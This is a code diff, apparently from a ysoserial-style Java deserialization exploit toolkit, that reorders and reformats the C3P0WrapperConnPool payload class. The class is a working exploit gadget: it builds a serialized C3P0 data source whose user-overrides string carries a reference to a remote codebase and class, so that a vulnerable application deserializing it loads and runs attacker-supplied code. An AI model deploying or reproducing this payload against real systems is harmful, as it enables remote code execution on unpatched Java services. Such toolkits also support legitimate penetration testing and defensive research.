@@ -15,19 +15,10 @@ import java.net.URI;
 import java.util.Hashtable;
 
 public class C3P0WrapperConnPool implements ObjectPayload<Object> {
-    @Override
-    public Object getObject(String command) throws Exception {
-        URI uri = new URI(command);
-        String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
-        WrapperConnectionPoolDataSource obj = Reflections.createWithoutConstructor(WrapperConnectionPoolDataSource.class);
-        Reflections.setFieldValue(obj, "userOverridesAsString", makeC3P0UserOverridesString(args[ 0 ], args[ 1 ]));
-        return obj;
-    }
-
-    public static String makeC3P0UserOverridesString ( String codebase, String clazz ) throws ClassNotFoundException, NoSuchMethodException,
+    public static String makeC3P0UserOverridesString(String codebase, String clazz) throws ClassNotFoundException, NoSuchMethodException,
             InstantiationException, IllegalAccessException, InvocationTargetException, IOException {
         ByteArrayOutputStream b = new ByteArrayOutputStream();
-        try ( ObjectOutputStream oos = new ObjectOutputStream(b) ) {
+        try (ObjectOutputStream oos = new ObjectOutputStream(b)) {
             Class<?> refclz = Class.forName("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized"); //$NON-NLS-1$
             Constructor<?> con = refclz.getDeclaredConstructor(Reference.class, Name.class, Name.class, Hashtable.class);
             con.setAccessible(true);
@@ -37,5 +28,14 @@ public class C3P0WrapperConnPool implements ObjectPayload<Object> {
         }
 
         return "HexAsciiSerializedMap:" + Hex.encodeHexString(b.toByteArray()) + ";"; //$NON-NLS-1$
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        URI uri = new URI(command);
+        String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
+        WrapperConnectionPoolDataSource obj = Reflections.createWithoutConstructor(WrapperConnectionPoolDataSource.class);
+        Reflections.setFieldValue(obj, "userOverridesAsString", makeC3P0UserOverridesString(args[0], args[1]));
+        return obj;
     }
 }
